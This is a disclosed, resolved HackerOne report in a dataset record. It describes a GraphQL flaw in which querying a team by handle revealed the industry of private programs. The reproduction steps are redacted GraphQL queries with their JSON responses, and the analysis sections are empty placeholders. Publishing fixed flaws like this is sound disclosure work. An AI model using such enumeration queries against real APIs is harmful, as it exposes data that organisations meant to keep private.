---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '707406'
original_report_id: '707406'
title: Team object in GraphQL disclosed of private programs via the industry
team_handle: security
created_at: '2019-10-04T03:19:58.748Z'
disclosed_at: '2019-11-23T09:19:24.466Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 68
tags:
- hackerone
---

# Team object in GraphQL disclosed of private programs via the industry

## Metadata

- HackerOne Report ID: 707406
- Weakness: 
- Program: security
- Disclosed At: 2019-11-23T09:19:24.466Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Disclosure of private programs across the industry


If the program is private, it will show industriy


### Steps To Reproduce
{"query": "query {team(handle:\\"█████████\\"){_id,industry}}"}

`{"data":{"team":{"_id":"█████████","industry":"Computer Hardware \u0026 Peripherals"}}}`

{"query": "query {team(handle:\\"█████████\\"){_id,industry}}"}

`{"data":{"team":{"_id":"████████","industry":"Computer Software"}}}`

{"query": "query {team(handle:\\"███\\"){_id,industry}}"}

`{"data":{"team":{"_id":"████","industry":null}}}`

## Impact

Disclosure of private programs

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
